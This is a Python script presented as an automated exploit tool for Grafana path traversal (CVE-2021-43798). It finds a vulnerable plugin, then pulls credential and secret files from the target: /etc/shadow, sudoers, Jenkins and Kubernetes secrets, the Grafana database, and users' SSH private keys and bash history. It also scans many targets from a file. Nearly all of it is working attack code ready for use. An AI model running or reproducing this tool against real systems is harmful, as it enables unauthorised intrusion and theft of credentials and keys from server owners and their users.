import sys
import urllib.request
import argparse
import os
import urllib.error
import ssl
from colorama import Fore, Style, init

init()

banner = f"""
{Fore.YELLOW}
          ▓▓
       ▒▒▓▓▓▓▓▒▒▓
  ▓▓▓▓▓▓▓▒▒   ▒▒▓▓                              ▒█▒                 ▒            ▒
  ▒▓▓▓▓          ▒▓    ▒█████▒                 ▓█▒                  █▓           ▓▒  █
   ▓▓▓    ▓▓▓▓▓▓▒  ▒  ▓█        █████▒ ▒█████▒▒███ ▓▓   █▓ ▓████▓▒  █▓   ▒███▓  ▒█▓ ████
  ▒▓▓▓   ▓▒    ▒▓▓    █▒  ▒▓▓▓  █▓    ▓█    █▒ █▓   █▒  █▒ ▓█    █▒ █▓  ▓█   ▒█  █▓ ▒█
▒▓▓▓▓▓   ▓      ▓▓    █▓     █  █▒    █▓    █▒ █▓   ▒▒▓█▒▒ ▓▓    █▓ █▓  █▓    █▒ █▓ ▒█
 ▒▒▓▓▓▒         ▓▓▓    ▓█▓▒▓██  █▒     █▓▒▒██▒ █▓  █▓   █▓ ▓█▓▒▒█▓  ▓█▒  █▓▒▓█▓  █▓  █▓▓▒
     ▓▓▓▒▒    ▒▓▒▒        ▒              ▒▒                ▓▓ ▒▒      ▒    ▒          ▒▒
     ▒▒▒▒▒▒▒▒▒▒▒                                           ▒▒

                                                                           version: 1.0.1
                                                                                {Style.RESET_ALL}wezoom.ca{Style.RESET_ALL}
"""
print(banner)

plugins = [
    "alertlist", "annolist", "barchart", "bargauge", "candlestick", "cloudwatch", "dashlist",
    "elasticsearch", "gauge", "geomap", "gettingstarted", "grafana-azure-monitor-datasource",
    "graph", "heatmap", "histogram", "influxdb", "jaeger", "logs", "loki", "mssql", "mysql",
    "news", "nodeGraph", "opentsdb", "piechart", "pluginlist", "postgres", "prometheus",
    "stackdriver", "stat", "state-timeline", "status-history", "table", "table-old", "tempo",
    "testdata", "text", "timeseries", "welcome", "zipkin"
]

sensitive_paths = [
    "/root/.ssh/id_rsa.pub",
    "/root/.ssh/id_rsa",
    "/home/{user}/.ssh/id_rsa.pub",
    "/home/{user}/.ssh/id_dsa.pub",
    "/home/{user}/.ssh/id_ecdsa.pub",
    "/home/{user}/.ssh/id_ed25519.pub",
    "/home/{user}/.ssh/id_x25519.pub",
    "/home/{user}/.ssh/id_rsa",
    "/home/{user}/.ssh/id_dsa",
    "/home/{user}/.ssh/id_ecdsa",
    "/home/{user}/.ssh/id_ed25519",
    "/home/{user}/.ssh/id_x25519",
    "/home/{user}/.bash_history",
    "/home/{user}/.ssh/authorized_keys",
    "/root/.bash_history",
    "/root/.ssh/authorized_keys",
    "/home/{user}/.ssh/authorized_keys"
]

common_paths = [
    "/etc/passwd",
    "/etc/os-release",
    "/etc/hosts",
    "/etc/group",
    "/var/lib/jenkins/secrets/hudson.util.Secret",
    "/var/lib/jenkins/secrets/master.key",
    "/var/lib/jenkins/config.xml",
    "/var/lib/jenkins/credentials.xml",
    "/etc/shadow",
    "/etc/securetty",
    "/etc/gshadow",
    "/etc/sudoers",
    "/var/log/auth.log",
    "/var/log/syslog",
    "/var/log/messages",
    "/var/log/secure",
    "/etc/krb5.conf",
    "/etc/ldap/ldap.conf",
    "/etc/openldap/ldap.conf",
    "/var/lib/kubelet/config.yaml",
    "/var/lib/etcd/member/snap/db",
    "/etc/kubernetes/admin.conf",
    "/etc/kubernetes/kubelet.conf",
    "/etc/kubernetes/controller-manager.conf",
    "/etc/kubernetes/scheduler.conf",
    "/etc/kubernetes/pki/ca.crt",
    "/var/lib/grafana/grafana.db",
    "/conf/defaults.ini",
    "/etc/grafana/grafana.ini",
    "/home/grafana/.bash_history",
    "/home/grafana/.ssh/id_rsa",
    "/root/.bash_history",
    "/root/.ssh/id_rsa",
    "/usr/local/etc/grafana/grafana.ini",
    "/proc/net/fib_trie",
    "/proc/net/tcp",
    "/proc/self/cmdline"
]

def find_vulnerable_plugin(url, path, timeout=10, context=None):
    if url.endswith('/'):
        url = url.rstrip('/')
    for plug in plugins:
        target_url = f"{url}/public/plugins/{plug}/../../../../../../../../../../../../../../../../../../..{path}"
        try:
            response = urllib.request.urlopen(target_url, timeout=timeout, context=context)
            status_code = response.getcode()
            if status_code == 200:
                print(f"{Fore.GREEN}[VULNERABLE] Plugin: {plug}{Style.RESET_ALL}")
                return plug
        except urllib.error.URLError as e:
            status_code = e.code if hasattr(e, 'code') else 'N/A'
            print(f"{Fore.RED}[-] Failed to download: {path} [status: {status_code}]{Style.RESET_ALL}")
            return None
        except Exception:
            print(f"{Fore.RED}[-] Failed to download: {path} [status: N/A]{Style.RESET_ALL}")
    return None

def exploit_vulnerability(url, path, plugin, output_dir, timeout=10, context=None):
    if url.endswith('/'):
        url = url.rstrip('/')
    host = url.split("//")[-1].split("/")[0].replace(":", "_")
    target_url = f"{url}/public/plugins/{plugin}/../../../../../../../../../../../../../../../../../../..{path}"
    try:
        response = urllib.request.urlopen(target_url, timeout=timeout, context=context)
        status_code = response.getcode()
        if status_code == 200:
            content = response.read().decode()
            if output_dir:
                os.makedirs(output_dir, exist_ok=True)
                output_path = os.path.join(output_dir, f"{host}_{os.path.basename(path)}")
                with open(output_path, 'w') as file:
                    file.write(content)
                print(f"{Style.RESET_ALL}                   [+] File: {output_path}")
            else:
                print(f"{Style.RESET_ALL}                   [+] Content: \n{content}")
        else:
            print(f"{Fore.RED}                   [-] Failed to download: {path} [status: {status_code}]{Style.RESET_ALL}")
    except urllib.error.URLError as e:
        status_code = e.code if hasattr(e, 'code') else 'N/A'
        print(f"{Fore.RED}[-] Failed to download: {path} [status: {status_code}]{Style.RESET_ALL}")
    except Exception:
        print(f"{Fore.RED}[-] Failed to download: {path} [status: N/A]{Style.RESET_ALL}")

def extract_users_with_interactive_shells(passwd_content):
    non_interactive_shells = [
        '/sbin/nologin',
        '/bin/false',
        '/usr/sbin/nologin',
        '/usr/bin/false',
        '/bin/sync',
        '/sbin/halt',
        '/sbin/shutdown',
        '/sbin/reboot'
    ]
    users = []
    for line in passwd_content.splitlines():
        parts = line.strip().split(':')
        if len(parts) >= 7:
            username = parts[0]
            uid = int(parts[2])
            shell = parts[-1]
            if username != 'root' and (shell not in non_interactive_shells and uid >= 1000):
                users.append(username)
    return users

def main():
    parser = argparse.ArgumentParser(
    description="Automated Exploit Tool for Grafana CVE-2021-43798: Scanning and Extracting SSH Keys from Compromised Users.\n\nDeveloped by: Halim Jabbes.\n\nLinkedIn: https://www.linkedin.com/in/hxlxmj\n\nRelease Date: 22-07-2024",
    formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("-t", "--target", help="Check a single target in the format proto://ip:port", type=str)
    parser.add_argument("-i", "--input-targets", help="Check multiple targets from a file in the format proto://ip:port", type=str)
    parser.add_argument("-o", "--output", help="Directory to download the file if found", type=str)
    parser.add_argument("-p", "--paths", help="File containing additional paths to check", default="common/paths.txt", type=str)
    parser.add_argument("-k", "--ignore-ssl", help="Ignore SSL certificate verification", action='store_true')

    args = parser.parse_args()

    # Create SSL context if ignoring SSL errors
    context = None
    if args.ignore_ssl:
        context = ssl._create_unverified_context()

    if not os.path.exists(args.paths):
        print(f"{Fore.RED}[!] Paths file {args.paths} does not exist.{Style.RESET_ALL}")
        sys.exit(1)

    with open(args.paths, 'r') as paths_file:
        additional_paths = [line.strip() for line in paths_file.readlines()]

    paths = additional_paths + sensitive_paths

    def process_target(target):
        tested_paths = set()
        tested_users = set()

        # First, process common paths to extract users
        passwd_content = None
        vulnerable_plugin = None
        print(f"{Fore.BLUE}[TARGET] Host: {target}{Style.RESET_ALL}")
        for path in common_paths:
            if path in tested_paths:
                continue
            print(f"{Fore.YELLOW}[INFO] Checking path: {path}{Style.RESET_ALL}")
            vulnerable_plugin = find_vulnerable_plugin(target, path, context=context)
            if vulnerable_plugin:
                exploit_vulnerability(target, path, vulnerable_plugin, args.output, context=context)
                tested_paths.add(path)
                if path == "/etc/passwd":
                    passwd_path = os.path.join(args.output, f"{target.split('//')[-1].split('/')[0].replace(':', '_')}_passwd") if args.output else None
                    if passwd_path and os.path.exists(passwd_path):
                        passwd_content = open(passwd_path).read()
                    break

        # If we have passwd content, extract users
        if passwd_content:
            users_with_interactive_shells = extract_users_with_interactive_shells(passwd_content)
            for user in users_with_interactive_shells:
                if user in tested_users:
                    continue
                tested_users.add(user)
                for sensitive_path in sensitive_paths:
                    user_path = sensitive_path.replace("{user}", user)
                    if user_path in tested_paths:
                        continue
                    exploit_vulnerability(target, user_path, vulnerable_plugin, args.output, context=context)
                    tested_paths.add(user_path)

        # Check additional paths
        for path in additional_paths:
            if path in tested_paths:
                continue
            print(f"{Fore.YELLOW}[INFO] Checking additional path: {path}{Style.RESET_ALL}")
            exploit_vulnerability(target, path, vulnerable_plugin, args.output, context=context)
            tested_paths.add(path)

    if args.target:
        process_target(args.target)

    if args.input_targets:
        with open(args.input_targets, 'r') as file:
            targets = file.readlines()
            for target in targets:
                target = target.strip()
                if target:
                    process_target(target)

if __name__ == "__main__":
    main()
